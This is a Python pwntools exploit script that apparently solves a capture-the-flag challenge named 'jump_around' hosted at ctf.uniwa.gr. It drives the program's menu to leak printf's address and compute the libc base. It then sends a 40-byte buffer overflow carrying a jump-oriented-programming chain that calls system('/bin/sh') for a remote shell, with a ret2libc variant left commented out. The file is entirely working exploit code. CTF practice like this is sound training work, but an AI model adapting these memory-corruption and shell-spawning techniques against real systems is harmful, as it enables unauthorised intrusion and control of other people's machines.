#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr'
port = 31454 	  
fname = './jump_around' 
LOCAL = False

if LOCAL:
	r = process(fname)
	_libc = '/lib/x86_64-linux-gnu/libc.so.6'
	libc = ELF(_libc)
else:
	r = remote(ip, port)
	_libc = './libc.so.6'
	libc = ELF(_libc)

e = ELF(fname)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def hop():
	sla('>', '1')

def skip():
	sla('>', '2')

def jump(payload):
	sla('>', '3')
	sla('>', payload)
	inter()

def pwn():
	libc_pop_rax = 0x43ae8
	libc_pop_rdi_jmp_rax = 0x98b2a
	shrooms = 0
	junk = b"A"*40

	# Call hop 6 times to make counter 15.
	for i in range(5):
		shrooms += 3
		hop()

	# Make counter 12.
	for i in range(2):
		shrooms -= 1
		skip()

	# Make counter 16 to leak libc.
	hop()
	shrooms += 3
	ru('Bonus item: [')
	leaked = int(ru(']')[:-1], 16)
	base = leaked - libc.symbols['printf']
	libc_pop_rax += base
	libc_pop_rdi_jmp_rax += base
	log.info('Leaked printf: 0x{:x}'.format(leaked))
	log.info('Libc base:     0x{:x}'.format(base))

	# Make counter 14 so it becomes 17 with a hop and 20 when enters the jump()
	for i in range(2):
		shrooms -= 1
		skip()

	hop()
	shrooms += 3
	log.info('Total \U0001F344: {}'.format(shrooms))
	payload = junk 

	# Ret2libc
	# payload += p64(0x215bf + base) # pop rdi
	# payload += p64(next(libc.search(b'/bin/sh')) + base)
	# payload += p64(base + 0x8aa) # ret
	# payload += p64(libc.symbols['system'] + base)
	####

	# JOP
	payload += p64(libc_pop_rax)
	payload += p64(libc.symbols['system'] + base)
	payload += p64(libc_pop_rdi_jmp_rax)
	payload += p64(next(libc.search(b'/bin/sh')) + base)
	
	jump(payload)

if __name__ == '__main__':
	pwn()